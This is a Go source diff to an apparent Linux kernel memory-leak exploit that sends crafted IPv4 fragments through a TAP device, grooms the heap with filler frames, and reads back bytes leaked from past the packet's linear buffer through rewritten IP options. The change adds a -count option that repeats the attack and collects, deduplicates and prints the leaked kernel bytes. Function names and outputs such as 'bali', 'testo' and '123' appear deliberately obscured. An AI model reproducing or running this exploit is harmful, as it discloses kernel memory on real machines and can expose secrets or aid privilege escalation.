@@ -8,6 +8,7 @@ import (
 	"fmt"
 	"net"
 	"os"
+	"sort"
 	"syscall"
 	"time"
 	"unsafe"
@@ -51,6 +52,7 @@ type cfg struct {
 	tebar      int
 	tebarFill  byte
 	capture    time.Duration
+	count      int
 	page       bool
 	skipVerify bool
 }
@@ -62,6 +64,7 @@ func parseCfg() cfg {
 	flag.IntVar(&c.tebar, "tebar", 0, "same-sized frames to allocate immediately before the head skb")
 	fill := flag.Int("tebar-fill", 0xee, "byte stored in tebar frames")
 	captureMs := flag.Int("capture-ms", 800, "time to collect output fragments")
+	flag.IntVar(&c.count, "count", 1, "number of samples; batches buffer output until all samples finish")
 	flag.BoolVar(&c.page, "page", false, "force a page_frag head (TUNSETSNDBUF=INT_MAX, nonblocking write)")
 	flag.BoolVar(&c.skipVerify, "skip-verify", false, "skip the single-datagram header rewrite check")
 	flag.Parse()
@@ -77,6 +80,10 @@ func parseCfg() cfg {
 	}
 	if c.capture <= 0 {
 		fmt.Fprintln(os.Stderr, "-capture-ms must be positive")
+		os.Exit(1)
+	}
+	if c.count <= 0 {
+		fmt.Fprintln(os.Stderr, "-count must be positive")
 		os.Exit(1)
 	}
 	return c
@@ -108,7 +115,29 @@ func run(c cfg) error {
 			return err
 		}
 	}
-	return bali(tap, cap, c)
+	seen := make(map[string][]byte)
+	verbose := c.count == 1
+	for i := 0; i < c.count; i++ {
+		leaks, err := bali(tap, cap, c, verbose)
+		if err != nil {
+			return err
+		}
+		for _, leak := range leaks {
+			seen[string(leak)] = leak
+		}
+	}
+	if !verbose {
+		keys := make([]string, 0, len(seen))
+		for key := range seen {
+			keys = append(keys, key)
+		}
+		sort.Strings(keys)
+		for _, key := range keys {
+			leak := seen[key]
+			fmt.Printf("past-linear hex=%s ascii=%q\n", hex.EncodeToString(leak), string(leak))
+		}
+	}
+	return nil
 }
 
 func verifyWrite(tap *os.File, cap *capture) error {
@@ -132,7 +161,7 @@ func verifyWrite(tap *os.File, cap *capture) error {
 	return nil
 }
 
-func bali(tap *os.File, cap *capture, c cfg) error {
+func bali(tap *os.File, cap *capture, c cfg, verbose bool) ([][]byte, error) {
 	payload := make([]byte, c.head+c.rest)
 	for i := 0; i < c.head; i++ {
 		payload[i] = marker
@@ -141,39 +170,47 @@ func bali(tap *os.File, cap *capture, c cfg) error {
 		payload[i] = 0x11
 	}
 	if !testo(payload, ipID) {
-		return errors.New("solver found no 0x4f00 adjustment")
+		return nil, errors.New("solver found no 0x4f00 adjustment")
 	}
-	printHead(c)
+	if verbose {
+		printHead(c)
+	}
 	second := frame(fragment(c.head, false, payload[c.head:]))
 	if err := writeTap(tap, second, true, l2Len+ipLen); err != nil {
-		return err
+		return nil, err
 	}
 	tebar := frame(datagram(0x1000, bytesRepeat(c.head, c.tebarFill)))
 	for i := 0; i < c.tebar; i++ {
 		if err := writeTap(tap, tebar, false, 0); err != nil {
-			return err
+			return nil, err
 		}
 	}
 	first := frame(fragment(0, true, payload[:c.head]))
 	if err := writeTap(tap, first, true, csumAtIP); err != nil {
-		return err
+		return nil, err
 	}
 	pkts := cap.collect(c.capture, ipID)
 	if len(pkts) == 0 {
-		return errors.New("no fragment captured")
+		return nil, errors.New("no fragment captured")
 	}
+	var leaks [][]byte
 	var balied, mutated bool
 	for i, ip := range pkts {
 		ihl := int(ip[0]&0x0f) * 4
-		fmt.Printf("frag %d first=0x%02x ihl_bytes=%d tot=%d\n",
-			i, ip[0], ihl, binary.BigEndian.Uint16(ip[2:]))
+		if verbose {
+			fmt.Printf("frag %d first=0x%02x ihl_bytes=%d tot=%d\n",
+				i, ip[0], ihl, binary.BigEndian.Uint16(ip[2:]))
+		}
 		if ip[0] != 0x4f {
 			continue
 		}
 		mutated = true
 		extra := ip[ipLen:ihl]
-		fmt.Printf("  options %d bytes: %s\n", len(extra), hex.EncodeToString(extra))
+		if verbose {
+			fmt.Printf("  options %d bytes: %s\n", len(extra), hex.EncodeToString(extra))
+		}
 		host := extra[c.head:]
+		leaks = append(leaks, append([]byte(nil), host...))
 		nonzero := 0
 		for _, b := range host {
 			if b != 0 {
@@ -183,18 +220,22 @@ func bali(tap *os.File, cap *capture, c cfg) error {
 		if len(host) > 0 {
 			balied = true
 		}
-		fmt.Printf("  past-linear hex=%s ascii=%q nonzero=%d/%d\n",
-			hex.EncodeToString(host), string(host), nonzero, len(host))
+		if verbose {
+			fmt.Printf("  past-linear hex=%s ascii=%q nonzero=%d/%d\n",
+				hex.EncodeToString(host), string(host), nonzero, len(host))
+		}
 	}
-	switch {
-	case balied:
-		fmt.Println("123")
-	case mutated:
-		fmt.Println("456")
-	default:
-		fmt.Println("678")
+	if verbose {
+		switch {
+		case balied:
+			fmt.Println("123")
+		case mutated:
+			fmt.Println("456")
+		default:
+			fmt.Println("678")
+		}
 	}
-	return nil
+	return leaks, nil
 }
 
 func testo(payload []byte, id uint16) bool {
@@ -297,7 +338,7 @@ func listen(ifname string) (*capture, error) {
 		syscall.Close(fd)
 		return nil, err
 	}
-	syscall.SetsockoptTimeval(fd, syscall.SOL_SOCKET, syscall.SO_RCVTIMEO, &syscall.Timeval{Usec: 100000})
+	syscall.SetsockoptTimeval(fd, syscall.SOL_SOCKET, syscall.SO_RCVTIMEO, &syscall.Timeval{Usec: 5000})
 	return &capture{fd: fd}, nil
 }
 
